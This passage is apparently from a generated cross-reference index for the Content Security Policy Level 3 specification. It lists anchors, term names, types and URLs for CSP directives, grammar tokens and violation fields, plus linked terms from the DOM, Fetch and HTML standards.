"#dom-securitypolicyviolationevent-violateddirective": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"violatedDirective","type":"attribute","url":"#dom-securitypolicyviolationevent-violateddirective"},
"#embedding-document": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"embedding document","type":"dfn","url":"#embedding-document"},
"#enforced": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"enforced","type":"dfn","url":"#enforced"},
"#enumdef-securitypolicyviolationeventdisposition": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"SecurityPolicyViolationEventDisposition","type":"enum","url":"#enumdef-securitypolicyviolationeventdisposition"},
"#fetch-directives": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"fetch directives","type":"dfn","url":"#fetch-directives"},
"#font-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"font-src","type":"dfn","url":"#font-src"},
"#form-action": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"form-action","type":"dfn","url":"#form-action"},
"#frame-ancestors": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"frame-ancestors","type":"dfn","url":"#frame-ancestors"},
"#frame-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"frame-src","type":"dfn","url":"#frame-src"},
"#global-object-csp-list": {"export":true,"for_":["global object"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"csp list","type":"dfn","url":"#global-object-csp-list"},
"#grammardef-ancestor-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"ancestor-source","type":"grammar","url":"#grammardef-ancestor-source"},
"#grammardef-ancestor-source-list": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"ancestor-source-list","type":"grammar","url":"#grammardef-ancestor-source-list"},
"#grammardef-base64-value": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"base64-value","type":"grammar","url":"#grammardef-base64-value"},
"#grammardef-directive-name": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"directive-name","type":"grammar","url":"#grammardef-directive-name"},
"#grammardef-directive-value": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"directive-value","type":"grammar","url":"#grammardef-directive-value"},
"#grammardef-hash-algorithm": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"hash-algorithm","type":"grammar","url":"#grammardef-hash-algorithm"},
"#grammardef-hash-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"hash-source","type":"grammar","url":"#grammardef-hash-source"},
"#grammardef-host-char": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"host-char","type":"grammar","url":"#grammardef-host-char"},
"#grammardef-host-part": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"host-part","type":"grammar","url":"#grammardef-host-part"},
"#grammardef-host-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"host-source","type":"grammar","url":"#grammardef-host-source"},
"#grammardef-keyword-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"keyword-source","type":"grammar","url":"#grammardef-keyword-source"},
"#grammardef-nonce-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"nonce-source","type":"grammar","url":"#grammardef-nonce-source"},
"#grammardef-none": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'none'","type":"grammar","url":"#grammardef-none"},
"#grammardef-optional-ascii-whitespace": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"optional-ascii-whitespace","type":"grammar","url":"#grammardef-optional-ascii-whitespace"},
"#grammardef-path-part": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"path-part","type":"grammar","url":"#grammardef-path-part"},
"#grammardef-port-part": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"port-part","type":"grammar","url":"#grammardef-port-part"},
"#grammardef-report-sample": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'report-sample'","type":"grammar","url":"#grammardef-report-sample"},
"#grammardef-required-ascii-whitespace": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"required-ascii-whitespace","type":"grammar","url":"#grammardef-required-ascii-whitespace"},
"#grammardef-scheme-part": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"scheme-part","type":"grammar","url":"#grammardef-scheme-part"},
"#grammardef-scheme-source": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"scheme-source","type":"grammar","url":"#grammardef-scheme-source"},
"#grammardef-self": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'self'","type":"grammar","url":"#grammardef-self"},
"#grammardef-serialized-directive": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"serialized-directive","type":"grammar","url":"#grammardef-serialized-directive"},
"#grammardef-serialized-policy": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"serialized-policy","type":"grammar","url":"#grammardef-serialized-policy"},
"#grammardef-serialized-source-list": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"serialized-source-list","type":"grammar","url":"#grammardef-serialized-source-list"},
"#grammardef-source-expression": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"source-expression","type":"grammar","url":"#grammardef-source-expression"},
"#grammardef-strict-dynamic": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'strict-dynamic'","type":"grammar","url":"#grammardef-strict-dynamic"},
"#grammardef-unsafe-allow-redirects": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'unsafe-allow-redirects'","type":"grammar","url":"#grammardef-unsafe-allow-redirects"},
"#grammardef-unsafe-eval": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'unsafe-eval'","type":"grammar","url":"#grammardef-unsafe-eval"},
"#grammardef-unsafe-hashes": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'unsafe-hashes'","type":"grammar","url":"#grammardef-unsafe-hashes"},
"#grammardef-unsafe-inline": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"'unsafe-inline'","type":"grammar","url":"#grammardef-unsafe-inline"},
"#header-content-security-policy": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"content-security-policy","type":"http-header","url":"#header-content-security-policy"},
"#header-content-security-policy-report-only": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"content-security-policy-report-only","type":"http-header","url":"#header-content-security-policy-report-only"},
"#host-part-match": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"host-part match","type":"dfn","url":"#host-part-match"},
"#img-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"img-src","type":"dfn","url":"#img-src"},
"#manifest-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"manifest-src","type":"dfn","url":"#manifest-src"},
"#media-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"media-src","type":"dfn","url":"#media-src"},
"#monitored": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"monitored","type":"dfn","url":"#monitored"},
"#navigate-to": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"navigate-to","type":"dfn","url":"#navigate-to"},
"#object-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"object-src","type":"dfn","url":"#object-src"},
"#path-part-match": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"path-part match","type":"dfn","url":"#path-part-match"},
"#policy-directive-set": {"export":true,"for_":["policy"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"directive set","type":"dfn","url":"#policy-directive-set"},
"#policy-disposition": {"export":true,"for_":["policy"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"disposition","type":"dfn","url":"#policy-disposition"},
"#policy-self-origin": {"export":true,"for_":["policy"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"self-origin","type":"dfn","url":"#policy-self-origin"},
"#policy-source": {"export":true,"for_":["policy"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"source","type":"dfn","url":"#policy-source"},
"#port-part-matches": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"port-part matches","type":"dfn","url":"#port-part-matches"},
"#prefetch-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"prefetch-src","type":"dfn","url":"#prefetch-src"},
"#report-to": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"report-to","type":"dfn","url":"#report-to"},
"#report-uri": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"report-uri","type":"dfn","url":"#report-uri"},
"#request-effective-directive": {"export":true,"for_":["request"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"effective directive","type":"dfn","url":"#request-effective-directive"},
"#sandbox": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sandbox","type":"dfn","url":"#sandbox"},
"#scheme-part-match": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"scheme-part match","type":"dfn","url":"#scheme-part-match"},
"#script-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"script-src","type":"dfn","url":"#script-src"},
"#script-src-attr": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"script-src-attr","type":"dfn","url":"#script-src-attr"},
"#script-src-elem": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"script-src-elem","type":"dfn","url":"#script-src-elem"},
"#securitypolicyviolationevent": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"SecurityPolicyViolationEvent","type":"interface","url":"#securitypolicyviolationevent"},
"#serialized-csp": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"serialized csp","type":"dfn","url":"#serialized-csp"},
"#serialized-directive": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"serialized directive","type":"dfn","url":"#serialized-directive"},
"#source-expression": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"source expression","type":"dfn","url":"#source-expression"},
"#source-list-allows-all-inline-behavior": {"export":true,"for_":["source list"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"allow all inline behavior","type":"dfn","url":"#source-list-allows-all-inline-behavior"},
"#source-lists": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"source lists","type":"dfn","url":"#source-lists"},
"#style-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"style-src","type":"dfn","url":"#style-src"},
"#style-src-attr": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"style-src-attr","type":"dfn","url":"#style-src-attr"},
"#style-src-elem": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"style-src-elem","type":"dfn","url":"#style-src-elem"},
"#violation": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"violation","type":"dfn","url":"#violation"},
"#violation-column-number": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"column number","type":"dfn","url":"#violation-column-number"},
"#violation-disposition": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"disposition","type":"dfn","url":"#violation-disposition"},
"#violation-effective-directive": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"effective directive","type":"dfn","url":"#violation-effective-directive"},
"#violation-element": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"element","type":"dfn","url":"#violation-element"},
"#violation-global-object": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"global object","type":"dfn","url":"#violation-global-object"},
"#violation-line-number": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"line number","type":"dfn","url":"#violation-line-number"},
"#violation-policy": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"policy","type":"dfn","url":"#violation-policy"},
"#violation-referrer": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"referrer","type":"dfn","url":"#violation-referrer"},
"#violation-resource": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"resource","type":"dfn","url":"#violation-resource"},
"#violation-sample": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sample","type":"dfn","url":"#violation-sample"},
"#violation-source-file": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"source file","type":"dfn","url":"#violation-source-file"},
"#violation-status": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"status","type":"dfn","url":"#violation-status"},
"#violation-url": {"export":true,"for_":["violation"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"url","type":"dfn","url":"#violation-url"},
"#worker-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"worker-src","type":"dfn","url":"#worker-src"},
"https://dom.spec.whatwg.org/#concept-document": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"document","type":"dfn","url":"https://dom.spec.whatwg.org/#concept-document"},
"https://dom.spec.whatwg.org/#concept-document-origin": {"export":true,"for_":["Document"],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"origin","type":"dfn","url":"https://dom.spec.whatwg.org/#concept-document-origin"},
"https://dom.spec.whatwg.org/#concept-event-fire": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"fire an event","type":"dfn","url":"https://dom.spec.whatwg.org/#concept-event-fire"},
"https://dom.spec.whatwg.org/#concept-shadow-including-root": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"shadow-including root","type":"dfn","url":"https://dom.spec.whatwg.org/#concept-shadow-including-root"},
"https://dom.spec.whatwg.org/#connected": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"connected","type":"dfn","url":"https://dom.spec.whatwg.org/#connected"},
"https://dom.spec.whatwg.org/#dictdef-eventinit": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"EventInit","type":"dictionary","url":"https://dom.spec.whatwg.org/#dictdef-eventinit"},
"https://dom.spec.whatwg.org/#document": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"Document","type":"interface","url":"https://dom.spec.whatwg.org/#document"},
"https://dom.spec.whatwg.org/#dom-event-bubbles": {"export":true,"for_":["Event"],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"bubbles","type":"attribute","url":"https://dom.spec.whatwg.org/#dom-event-bubbles"},
"https://dom.spec.whatwg.org/#dom-event-composed": {"export":true,"for_":["Event"],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"composed","type":"attribute","url":"https://dom.spec.whatwg.org/#dom-event-composed"},
"https://dom.spec.whatwg.org/#dom-event-target": {"export":true,"for_":["Event"],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"target","type":"attribute","url":"https://dom.spec.whatwg.org/#dom-event-target"},
"https://dom.spec.whatwg.org/#element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"Element","type":"interface","url":"https://dom.spec.whatwg.org/#element"},
"https://dom.spec.whatwg.org/#event": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"dom","spec":"dom","status":"current","text":"Event","type":"interface","url":"https://dom.spec.whatwg.org/#event"},
"https://encoding.spec.whatwg.org/#utf-8-encode": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"encoding","spec":"encoding","status":"current","text":"utf-8 encode","type":"dfn","url":"https://encoding.spec.whatwg.org/#utf-8-encode"},
"https://fetch.spec.whatwg.org/#concept-fetch": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"fetch","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-fetch"},
"https://fetch.spec.whatwg.org/#concept-http-fetch": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"http fetch","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-http-fetch"},
"https://fetch.spec.whatwg.org/#concept-http-network-fetch": {"export":false,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"http-network fetch","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-http-network-fetch"},
"https://fetch.spec.whatwg.org/#concept-main-fetch": {"export":false,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"main fetch","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-main-fetch"},
"https://fetch.spec.whatwg.org/#concept-network-error": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"network error","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-network-error"},
"https://fetch.spec.whatwg.org/#concept-request": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"request","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request"},
"https://fetch.spec.whatwg.org/#concept-request-body": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"body","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-body"},
"https://fetch.spec.whatwg.org/#concept-request-client": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"client","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-client"},
"https://fetch.spec.whatwg.org/#concept-request-credentials-mode": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"credentials mode","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-credentials-mode"},
"https://fetch.spec.whatwg.org/#concept-request-current-url": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"current url","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-current-url"},
"https://fetch.spec.whatwg.org/#concept-request-destination": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"destination","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-destination"},
"https://fetch.spec.whatwg.org/#concept-request-header-list": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"header list","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-header-list"},
"https://fetch.spec.whatwg.org/#concept-request-initiator": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"initiator","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-initiator"},
"https://fetch.spec.whatwg.org/#concept-request-integrity-metadata": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"integrity metadata","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-integrity-metadata"},
"https://fetch.spec.whatwg.org/#concept-request-method": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"method","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-method"},
"https://fetch.spec.whatwg.org/#concept-request-mode": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"mode","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-mode"},
"https://fetch.spec.whatwg.org/#concept-request-nonce-metadata": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"cryptographic nonce metadata","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"},
"https://fetch.spec.whatwg.org/#concept-request-origin": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"origin","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-origin"},
"https://fetch.spec.whatwg.org/#concept-request-parser-metadata": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"parser metadata","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-parser-metadata"},
"https://fetch.spec.whatwg.org/#concept-request-redirect-count": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"redirect count","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-redirect-count"},
"https://fetch.spec.whatwg.org/#concept-request-redirect-mode": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"redirect mode","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-redirect-mode"},
"https://fetch.spec.whatwg.org/#concept-request-target-browsing-context": {"export":true,"for_":["request"],"level":"","normative":true,"shortname":"fetch","spec":"fetch","status":"anchor-block","text":"target browsing context","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-target-browsing-context"},
"https://fetch.spec.whatwg.org/#concept-request-url": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"url","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-url"},
"https://fetch.spec.whatwg.org/#concept-request-window": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"window","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-request-window"},
"https://fetch.spec.whatwg.org/#concept-response": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"response","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-response"},
"https://fetch.spec.whatwg.org/#concept-response-header-list": {"export":true,"for_":["response"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"header list","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-response-header-list"},
"https://fetch.spec.whatwg.org/#concept-response-status": {"export":true,"for_":["response"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"status","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-response-status"},
"https://fetch.spec.whatwg.org/#concept-response-url": {"export":true,"for_":["response"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"url","type":"dfn","url":"https://fetch.spec.whatwg.org/#concept-response-url"},
"https://fetch.spec.whatwg.org/#extract-header-list-values": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"extracting header list values","type":"dfn","url":"https://fetch.spec.whatwg.org/#extract-header-list-values"},
"https://fetch.spec.whatwg.org/#http-scheme": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"http(s) scheme","type":"dfn","url":"https://fetch.spec.whatwg.org/#http-scheme"},
"https://fetch.spec.whatwg.org/#local-scheme": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"local scheme","type":"dfn","url":"https://fetch.spec.whatwg.org/#local-scheme"},
"https://fetch.spec.whatwg.org/#redirect-status": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"redirect status","type":"dfn","url":"https://fetch.spec.whatwg.org/#redirect-status"},
"https://fetch.spec.whatwg.org/#request-destination-script-like": {"export":true,"for_":["request/destination"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"script-like","type":"dfn","url":"https://fetch.spec.whatwg.org/#request-destination-script-like"},
"https://fetch.spec.whatwg.org/#request-keepalive-flag": {"export":true,"for_":["request"],"level":"1","normative":true,"shortname":"fetch","spec":"fetch","status":"current","text":"keepalive","type":"dfn","url":"https://fetch.spec.whatwg.org/#request-keepalive-flag"},
"https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy": {"export":true,"for_":[],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"content security policy state","type":"dfn","url":"https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy"},
"https://html.spec.whatwg.org/#browsing-context": {"export":true,"for_":[],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"browsing context","type":"dfn","url":"https://html.spec.whatwg.org/#browsing-context"},
"https://html.spec.whatwg.org/#concept-WorkerGlobalScope-owner-set": {"export":true,"for_":["WorkerGlobalScope"],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"owner set","type":"dfn","url":"https://html.spec.whatwg.org/#concept-WorkerGlobalScope-owner-set"},
"https://html.spec.whatwg.org/#concept-origin": {"export":true,"for_":[],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"origin","type":"dfn","url":"https://html.spec.whatwg.org/#concept-origin"},
"https://html.spec.whatwg.org/#initialise-the-document-object": {"export":true,"for_":[],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"create and initialize a new document object","type":"dfn","url":"https://html.spec.whatwg.org/#initialise-the-document-object"},
"https://html.spec.whatwg.org/#parser-inserted": {"export":true,"for_":["script"],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"\"parser-inserted\"","type":"dfn","url":"https://html.spec.whatwg.org/#parser-inserted"},
"https://html.spec.whatwg.org/#process-the-iframe-attributes": {"export":true,"for_":[],"level":"","normative":true,"shortname":"html","spec":"html","status":"anchor-block","text":"process the iframe attributes","type":"dfn","url":"https://html.spec.whatwg.org/#process-the-iframe-attributes"},
"https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"ascii serialization of an origin","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin"},
"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"opaque origin","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque"},
"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme": {"export":true,"for_":["origin"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"scheme","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme"},
"https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"parse a sandboxing directive","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive"},
"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"sandboxed origin browsing context flag","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag"},
"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"sandboxed scripts browsing context flag","type":"dfn","url":"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag"},
"https://html.spec.whatwg.org/multipage/document-sequences.html#top-level-browsing-context": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"top-level browsing context","type":"dfn","url":"https://html.spec.whatwg.org/multipage/document-sequences.html#top-level-browsing-context"},
